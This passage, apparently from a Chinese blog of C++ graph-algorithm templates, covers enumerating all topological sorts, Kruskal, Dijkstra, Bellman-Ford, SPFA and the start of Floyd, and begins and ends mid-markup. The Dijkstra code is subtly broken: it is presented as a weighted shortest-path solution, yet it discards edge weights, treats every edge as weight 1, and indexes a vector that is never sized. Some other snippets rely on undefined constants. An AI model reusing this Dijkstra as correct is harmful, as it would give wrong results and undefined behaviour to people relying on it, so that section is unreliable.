class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> int long long</span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-comment">// 回溯生成所有拓扑排序</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">allTopologicalSorts</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; to, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; inDeg, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt;&amp; visited, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; sortOrder)</span> &#123;<br>    <span class="hljs-type">bool</span> flag = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// 用来检查是否有入度为 0 的节点</span><br><br>    <span class="hljs-comment">// 遍历所有节点，查找入度为 0 且未访问的节点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (inDeg[i] == <span class="hljs-number">0</span> &amp;&amp; !visited[i]) &#123;<br>            <span class="hljs-comment">// 标记该节点已访问</span><br>            visited[i] = <span class="hljs-literal">true</span>;<br>            sortOrder.push_back(i);  <span class="hljs-comment">// 将该节点加入拓扑排序</span><br>            <span class="hljs-comment">// 将该节点的邻接节点的入度减 1</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[i]) &#123;<br>                inDeg[y]--;<br>            &#125;<br>            <span class="hljs-comment">// 递归调用生成后续的拓扑排序</span><br>            allTopologicalSorts(n, to, inDeg, visited, sortOrder);<br>            <span class="hljs-comment">// 回溯过程：恢复状态</span><br>            visited[i] = <span class="hljs-literal">false</span>;<br>            sortOrder.pop_back();  <span class="hljs-comment">// 移除当前节点</span><br>            <span class="hljs-comment">// 恢复该节点邻接节点的入度</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[i]) &#123;<br>                inDeg[y]++;<br>            &#125;<br>            flag = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 标记已经处理了一个入度为 0 的节点</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 如果没有更多节点可以选择，说明已经生成了一个完整的拓扑排序</span><br>    <span class="hljs-keyword">if</span> (!flag) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : sortOrder) &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// 输出当前的拓扑排序</span><br>        &#125;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 主函数：执行拓扑排序</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">generateAllTopologicalSorts</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; edges)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; to(n);  <br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">inDeg</span><span class="hljs-params">(n, <span class="hljs-number">0</span>)</span>;    <span class="hljs-comment">// 入度数组</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title function_">visited</span><span class="hljs-params">(n, <span class="hljs-literal">false</span>)</span>;  <span class="hljs-comment">// 访问标记数组</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; sortOrder;      <span class="hljs-comment">// 存储当前拓扑排序</span><br>    <span class="hljs-comment">// 构建图的邻接表和入度数组</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; edge : edges) &#123;<br>        <span class="hljs-type">int</span> from = edge[<span class="hljs-number">0</span>];  <span class="hljs-comment">// 边的起点</span><br>        <span class="hljs-type">int</span> toNode = edge[<span class="hljs-number">1</span>];  <span class="hljs-comment">// 边的终点</span><br>        to[from].push_back(toNode);  <span class="hljs-comment">// 添加边到邻接表</span><br>        inDeg[toNode]++;  <span class="hljs-comment">// 终点的入度加1</span><br>    &#125;<br>    <span class="hljs-comment">// 调用回溯函数生成所有拓扑排序</span><br>    allTopologicalSorts(n, to, inDeg, visited, sortOrder);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 返回成功</span><br>&#125;<br><span class="hljs-type">signed</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">6</span>;  <span class="hljs-comment">// 节点数</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; edges = &#123;<br>        &#123;<span class="hljs-number">5</span>, <span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-number">5</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>&#125;  <span class="hljs-comment">// 边列表</span><br>    &#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;All Topological Sorts: &quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    generateAllTopologicalSorts(n, edges);  <span class="hljs-comment">// 生成并输出所有拓扑排序</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Kruskal-算法：生成最小生成树"><a href="#Kruskal-算法：生成最小生成树" class="headerlink" title="Kruskal 算法：生成最小生成树"></a>Kruskal 算法：生成最小生成树</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1005</span>;<br><span class="hljs-type">int</span> p[N];  <span class="hljs-comment">// 并查集的父节点数组</span><br><br><span class="hljs-comment">// 存储图的边 &#123;权重, &#123;节点a, 节点b&#125;&#125;</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;&gt; edges;<br><br><span class="hljs-comment">// 并查集的核心操作</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> p[x] == x ? x : (p[x] = find(p[x]));<br>&#125;<br><br><span class="hljs-comment">// Kruskal 算法：生成最小生成树</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">kruskal</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> m)</span> &#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>, cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) p[i] = i;  <span class="hljs-comment">// 初始化并查集</span><br><br>    sort(edges.begin(), edges.end());  <span class="hljs-comment">// 按权重排序</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; edge : edges) &#123;<br>        <span class="hljs-type">int</span> w = edge.first, a = edge.second.first, b = edge.second.second;<br>        a = find(a), b = find(b);<br><br>        <span class="hljs-keyword">if</span> (a != b) &#123;  <span class="hljs-comment">// 如果不在同一连通块</span><br>            p[a] = b;  <span class="hljs-comment">// 合并</span><br>            res += w;<br>            <span class="hljs-keyword">if</span> (++cnt == n - <span class="hljs-number">1</span>) <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 已经形成最小生成树</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> cnt == n - <span class="hljs-number">1</span> ? res : <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 如果不连通，返回 -1</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> n, m;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; m;<br><br>    <span class="hljs-comment">// 输入边</span><br>    edges.resize(m);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-type">int</span> a, b, w;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; a &gt;&gt; b &gt;&gt; w;<br>        edges[i] = &#123;w, &#123;a, b&#125;&#125;;<br>    &#125;<br><br>    <span class="hljs-type">int</span> result = kruskal(n, m);<br>    <span class="hljs-keyword">if</span> (result == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;无法生成最小生成树&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;最小生成树的权重是: &quot;</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Dijkstra-算法"><a href="#Dijkstra-算法" class="headerlink" title="Dijkstra 算法"></a>Dijkstra 算法</h3><p>单起点多终点正权最短路</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> int long long  <span class="hljs-comment">// 定义为 long long 方便处理大数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; PII;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span> + <span class="hljs-number">5</span>;  <span class="hljs-comment">// 预设最大节点数</span><br><span class="hljs-type">int</span> n, m;                <span class="hljs-comment">// 节点数和边数</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; to;  <span class="hljs-comment">// 用邻接表存储图（出边数组）</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; dist;        <span class="hljs-comment">// 存储最短路径</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt; st;         <span class="hljs-comment">// 存储每个点是否已经确定最短路径</span><br><br><span class="hljs-comment">// 图的构建函数：添加一条边</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_edge</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> weight)</span> &#123;<br>    to[a].push_back(b); <span class="hljs-comment">// 有向图只添加 a -&gt; b</span><br>&#125;<br><br><span class="hljs-comment">// Dijkstra 算法：求 1 号点到 n 号点的最短路径</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dijkstra</span><span class="hljs-params">()</span> &#123;<br>    dist.assign(n, LLONG_MAX);  <span class="hljs-comment">// 初始化 dist 数组为无穷大</span><br>    dist[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 起点 0 的距离为 0</span><br>    <span class="hljs-built_in">priority_queue</span>&lt;PII, <span class="hljs-built_in">vector</span>&lt;PII&gt;, greater&lt;PII&gt;&gt; heap;  <span class="hljs-comment">// 最小堆</span><br>    heap.push(&#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;);  <span class="hljs-comment">// 起点加入堆，&#123;距离, 节点&#125;</span><br><br>    <span class="hljs-keyword">while</span> (!heap.empty()) &#123;<br>        <span class="hljs-keyword">auto</span> t = heap.top();<br>        heap.pop();<br><br>        <span class="hljs-type">int</span> ver = t.second, distance = t.first;<br><br>        <span class="hljs-keyword">if</span> (st[ver]) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// 如果已经访问过，则跳过</span><br>        st[ver] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 标记当前节点已访问</span><br><br>        <span class="hljs-comment">// 遍历当前节点的所有邻接点</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j : to[ver]) &#123;  <span class="hljs-comment">// 直接遍历出边数组</span><br>            <span class="hljs-keyword">if</span> (dist[j] &gt; distance + <span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">// 假设所有边权为 1</span><br>                dist[j] = distance + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 更新最短距离</span><br>                heap.push(&#123;dist[j], j&#125;);  <span class="hljs-comment">// 将更新后的邻接点加入堆</span><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 返回从 0 号点到 n-1 号点的最短距离</span><br>    <span class="hljs-keyword">if</span> (dist[n<span class="hljs-number">-1</span>] == LLONG_MAX) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 如果无法到达，返回 -1</span><br>    <span class="hljs-keyword">return</span> dist[n<span class="hljs-number">-1</span>];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; n &gt;&gt; m;<br>    to.resize(n);  <span class="hljs-comment">// 初始化邻接表</span><br><br>    <span class="hljs-comment">// 输入边</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>        <span class="hljs-type">int</span> a, b, weight;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; a &gt;&gt; b &gt;&gt; weight;<br>        add_edge(a, b, weight);  <span class="hljs-comment">// 添加边 a -&gt; b</span><br>    &#125;<br><br>    <span class="hljs-comment">// 执行 Dijkstra 算法</span><br>    <span class="hljs-type">int</span> result = dijkstra();<br>    <span class="hljs-built_in">cout</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 输出结果</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Bellman-Ford"><a href="#Bellman-Ford" class="headerlink" title="Bellman-Ford"></a>Bellman-Ford</h3><p>单起点多终点负权最短路</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> n, m;       <span class="hljs-comment">// n表示点数，m表示边数</span><br><span class="hljs-type">int</span> dist[N];        <span class="hljs-comment">// dist[x]存储1到x的最短路距离</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Edge</span>     // 边，<span class="hljs-title">a</span>表示出点，<span class="hljs-title">b</span>表示入点，<span class="hljs-title">w</span>表示边的权重</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> a, b, w;<br>&#125;edges[M];<br><br><span class="hljs-comment">// 求1到n的最短路距离，如果无法从1走到n，则返回-1。</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bellman_ford</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 如果第n次迭代仍然会松弛三角不等式，就说明存在一条长度是n+1的最短路径，由抽屉原理，路径中至少存在两个相同的点，说明图中存在负权回路。</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j ++ )<br>        &#123;<br>            <span class="hljs-type">int</span> a = edges[j].a, b = edges[j].b, w = edges[j].w;<br>            <span class="hljs-keyword">if</span> (dist[b] &gt; dist[a] + w)<br>                dist[b] = dist[a] + w;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dist[n] &gt; <span class="hljs-number">0x3f3f3f3f</span> / <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="spfa-算法"><a href="#spfa-算法" class="headerlink" title="spfa 算法"></a>spfa 算法</h3><p>队列优化的Bellman-Ford算法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> n;      <span class="hljs-comment">// 总点数</span><br><span class="hljs-type">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="hljs-comment">// 邻接表存储所有边</span><br><span class="hljs-type">int</span> dist[N];        <span class="hljs-comment">// 存储每个点到1号点的最短距离</span><br><span class="hljs-type">bool</span> st[N];     <span class="hljs-comment">// 存储每个点是否在队列中</span><br><br><span class="hljs-comment">// 求1号点到n号点的最短路距离，如果从1号点无法走到n号点则返回-1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">spfa</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">queue</span>&lt;<span class="hljs-type">int</span>&gt; q;<br>    q.push(<span class="hljs-number">1</span>);<br>    st[<span class="hljs-number">1</span>] = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">while</span> (q.size())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = q.front();<br>        q.pop();<br><br>        st[t] = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        &#123;<br>            <span class="hljs-type">int</span> j = e[i];<br>            <span class="hljs-keyword">if</span> (dist[j] &gt; dist[t] + w[i])<br>            &#123;<br>                dist[j] = dist[t] + w[i];<br>                <span class="hljs-keyword">if</span> (!st[j])     <span class="hljs-comment">// 如果队列中已存在j，则不需要将j重复插入</span><br>                &#123;<br>                    q.push(j);<br>                    st[j] = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dist[n] == <span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br></code></pre></td></tr></table></figure><p>spfa判断图中是否存在负环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> n;      <span class="hljs-comment">// 总点数</span><br><span class="hljs-type">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="hljs-comment">// 邻接表存储所有边</span><br><span class="hljs-type">int</span> dist[N], cnt[N];        <span class="hljs-comment">// dist[x]存储1号点到x的最短距离，cnt[x]存储1到x的最短路中经过的点数</span><br><span class="hljs-type">bool</span> st[N];     <span class="hljs-comment">// 存储每个点是否在队列中</span><br><br><span class="hljs-comment">// 如果存在负环，则返回true，否则返回false。</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">spfa</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">// 不需要初始化dist数组</span><br>    <span class="hljs-comment">// 原理：如果某条最短路径上有n个点（除了自己），那么加上自己之后一共有n+1个点，由抽屉原理一定有两个点相同，所以存在环。</span><br><br>    <span class="hljs-built_in">queue</span>&lt;<span class="hljs-type">int</span>&gt; q;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>    &#123;<br>        q.push(i);<br>        st[i] = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (q.size())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = q.front();<br>        q.pop();<br><br>        st[t] = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        &#123;<br>            <span class="hljs-type">int</span> j = e[i];<br>            <span class="hljs-keyword">if</span> (dist[j] &gt; dist[t] + w[i])<br>            &#123;<br>                dist[j] = dist[t] + w[i];<br>                cnt[j] = cnt[t] + <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span> (cnt[j] &gt;= n) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;       <span class="hljs-comment">// 如果从1号点到x的最短路中包含至少n个点（不包括自己），则说明存在环</span><br>                <span class="hljs-keyword">if</span> (!st[j])<br>                &#123;<br>                    q.push(j);<br>                    st[j] = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Floyd"><a href="#Floyd" class="headerlink" title="Floyd"></a>Floyd</h3><p>多起点多终点最短路</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">初始化：<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>            <span class="hljs-keyword">if</span> (i == j) d[i][j] = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">else</span> d[i][j] = INF;<br><br><span 